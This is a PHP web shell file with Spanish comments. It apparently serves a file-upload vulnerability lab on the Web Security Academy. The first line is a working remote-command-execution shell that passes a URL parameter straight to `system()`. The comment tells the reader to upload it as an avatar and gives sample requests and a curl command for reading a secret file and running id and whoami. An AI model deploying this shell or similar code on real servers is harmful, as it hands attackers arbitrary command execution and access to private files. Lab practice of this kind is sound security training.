<?php echo system($_GET['command']); ?>
<?php /*
Web shell RCE. Subir como .php y ejecutar comandos por el parametro ?command= :

    GET /files/avatars/example.php?command=cat%20/home/carlos/secret
    GET /files/avatars/example.php?command=id
    GET /files/avatars/example.php?command=whoami

El objetivo del lab casi siempre es leer  /home/carlos/secret .
Con curl:
    curl 'https://LAB-ID.web-security-academy.net/files/avatars/example.php?command=cat%20/home/carlos/secret'

Nota: `echo system(...)` duplica la ULTIMA linea (system ya imprime la salida y
echo re-imprime lo que devuelve). Para salida limpia usa example_best.php.
*/ ?>
